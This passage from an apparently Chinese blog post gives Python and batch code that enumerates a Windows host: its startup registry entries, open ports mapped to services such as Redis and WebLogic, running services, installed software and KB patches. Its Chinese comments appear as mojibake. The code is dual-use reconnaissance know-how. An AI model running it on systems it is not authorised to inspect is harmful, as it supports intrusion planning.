class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¯åŠ¨é¡¹ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] è·å–ä¸»æœºå¼€æ”¾ç«¯å£æœåŠ¡ä¿¡æ¯......&quot;</span>)</span><br><span class="line">    services_found = []  <span class="comment"># ä¿å­˜è¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡ä¿¡æ¯</span></span><br><span class="line">    services_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¹¶æå–ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># åªè¾“å‡º LISTENING çŠ¶æ€çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åªæ˜¾ç¤ºæœ¬åœ°åœ°å€ã€çŠ¶æ€å’Œ PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># ä» local_address ä¸­æå– IP åœ°å€å’Œç«¯å£</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># å°è¯•ä»å­—å…¸ä¸­è·å–æœåŠ¡ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¾“å‡º &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># è¾“å‡º IPåœ°å€ã€ç«¯å£ã€çŠ¶æ€å’Œ PIDã€æœåŠ¡</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æœ¬åœ°è¿æ¥IP ç«¯å£å»é‡  å¹¶ç”¨portè¿›è¡Œæ’åº</span></span><br><span class="line">        services_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_found&#125;]</span><br><span class="line">        services_found = <span class="built_in">sorted</span>(services_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_unfound&#125;]</span><br><span class="line">        services_unfound = <span class="built_in">sorted</span>(services_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªå·²çŸ¥ç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªæœªçŸ¥ç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] è¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] æœªè¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœæœªæ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼Œåˆ™è¾“å‡ºä¸€æ¡æ¶ˆæ¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°ç›¸å…³ä¿¡æ¯!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] è·å–ä¸»æœºæ­£åœ¨è¿è¡Œçš„æœåŠ¡......&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡&quot; | find /v &quot;å‘½ä»¤æˆåŠŸå®Œæˆ&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># å»ç©ºè¡Œ</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="built_in">print</span>(netstat_output)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">bat_file_path = <span class="string">r&#x27;getosinfo1.bat&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­£å¸¸ å¯åœ¨ win2003 cmdä¸‹ è¿è¡Œ   cmd /c 1.bat è·å–ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">    <span class="comment"># ä½†æ˜¯åœ¨è¿™è¿è¡Œä¸äº† æ˜¯å› ä¸º batè„šæœ¬ä¸ºutf-8ç¼–ç  éœ€è¦æ”¹æˆANSI</span></span><br><span class="line">    <span class="comment"># print(&quot;[+] å‡†å¤‡è¿è¡Œbatè„šæœ¬è·å–ç³»ç»Ÿä¿¡æ¯...&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¿™æ ·è§£å†³äº† è¾“å‡ºç»“æœçš„ä¸­æ–‡ä¹±ç é—®é¢˜ ä½†æ˜¯åœ¨å‘½ä»¤è¡Œæ“ä½œæ—¶ é€šè¿‡findstr å»ç­›é€‰ä¸­æ–‡ ç¼–ç æ”¹å˜åå°†ä¼šæ‰¾ä¸åˆ°</span></span><br><span class="line">    <span class="comment"># subprocess.call([&quot;chcp&quot;, &quot;65001&quot;], shell=True)</span></span><br><span class="line">    <span class="comment"># result = subprocess.call([bat_file_path], shell=True)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è°ƒç”¨batè„šæœ¬å¹¶è·å–è¾“å‡º</span></span><br><span class="line">    process = subprocess.Popen([bat_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    output, error = process.communicate()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¾“å‡ºè„šæœ¬æ‰§è¡Œç»“æœ</span></span><br><span class="line">    <span class="built_in">print</span>(output.decode(<span class="string">&#x27;cp936&#x27;</span>))</span><br><span class="line">    <span class="comment"># print(&quot;[+] è¿è¡Œç»“æŸ...&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] æ£€æµ‹åˆ°å½“å‰ä¸»æœºç³»ç»Ÿä¸º&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] å¼€å§‹å¯¹æœ¬æœºè¿›è¡Œä¿¡æ¯æ”¶é›†,è¯·ç¨ç­‰ç‰‡åˆ»......&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    <span class="comment"># ç³»ç»Ÿä¿¡æ¯  é€šè¿‡æ‰batè„šæœ¬è·å–ä¿¡æ¯  è¡¥ä¸è¯¦æƒ…å¤„æœ‰ç‚¹é—®é¢˜!</span></span><br><span class="line">    getSystemInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#è‡ªå¯åŠ¨é¡¹ ç«¯å£ å®‰è£…åº”ç”¨ è¿è¡ŒæœåŠ¡</span></span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ™®é€šç”¨æˆ·æ²¡æƒé™ è¿™ä¸ªå¯ä»¥è€ƒè™‘å¿½ç•¥æ‰</span></span><br><span class="line">    <span class="comment"># getScheduleTaskInfo()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>getosinfo1.bat</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] ç³»ç»Ÿä¿¡æ¯:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;ä¸»æœºå&quot; /c:&quot;OS åç§°&quot; /c:&quot;OS ç‰ˆæœ¬&quot; | <span class="built_in">find</span> /v &quot;BIOS ç‰ˆæœ¬&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IPv4åœ°å€:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">findstr</span> /i &quot;IPv4 åœ°å€ IP Address&quot; ^| <span class="built_in">findstr</span> /i /v &quot;IPv6&quot;&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºå·²å®‰è£…çš„ä¿®å¤è¡¥ä¸:</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM è¿è¡Œ systeminfo å‘½ä»¤å¹¶å°†ç»“æœä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM éå†æ–‡ä»¶å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=* delims= &quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">%%a</span> | <span class="built_in">findstr</span> /r /C:&quot;\[[<span class="number">0</span>-<span class="number">9</span>]*\]\:\ KB[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]&quot;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">%%a</span> | <span class="built_in">findstr</span> /r /C:&quot;\[[<span class="number">0</span>-<span class="number">9</span>]*\]\:\ Q[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM åˆ é™¤ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h3 id="Version3"><a href="#Version3" class="headerlink" title="Version3"></a>Version3</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPCï¼ˆRemote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># åˆ°è¾¾æ³¨å†Œè¡¨æœ«å°¾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span class="comment"># print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 